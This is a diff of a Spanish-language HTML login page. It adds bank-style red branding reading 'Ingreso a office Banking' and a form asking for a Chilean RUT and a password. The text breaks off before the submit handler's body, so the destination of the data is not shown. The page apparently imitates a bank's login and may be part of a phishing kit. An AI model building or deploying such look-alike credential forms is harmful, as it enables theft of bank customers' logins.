@@ -1,18 +1,84 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Ingreso</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: white;
+      font-family: Arial, sans-serif;
+    }
+    .contenedor {
+      border: 3px solid red;
+      max-width: 400px;
+      margin: 30px auto;
+      padding: 20px;
+      background: white;
+    }
+    h2 {
+      text-align: center;
+      font-size: 1.5em;
+    }
+    .titulo {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 5px;
+      margin-bottom: 20px;
+    }
+    .titulo span:first-child {
+      color: black;
+      font-weight: bold;
+    }
+    .titulo span:last-child {
+      background-color: red;
+      color: white;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-weight: bold;
+    }
+    label {
+      display: block;
+      margin-top: 10px;
+      font-weight: bold;
+      color: black;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid black;
+      margin-top: 5px;
+      border-radius: 4px;
+    }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 10px;
+      background-color: red;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
-  <form onsubmit="enviarFormulario(event)">
-    <label>RUT</label>
-    <input type="text" id="rut" required />
-    <label>Contraseña</label>
-    <input type="password" id="clave" required />
-    <button type="submit">Ingresar</button>
-  </form>
+  <div class="contenedor">
+    <div class="titulo">
+      <span>Ingreso a office</span><span>Banking</span>
+    </div>
+    <form onsubmit="enviarFormulario(event)">
+      <label for="rut">RUT</label>
+      <input type="text" id="rut" required />
+      <label for="clave">Contraseña</label>
+      <input type="password" id="clave" required />
+      <button type="submit">Ingresar</button>
+    </form>
+  </div>
+
   <script>
     function enviarFormulario(e) {
       e.preventDefault();
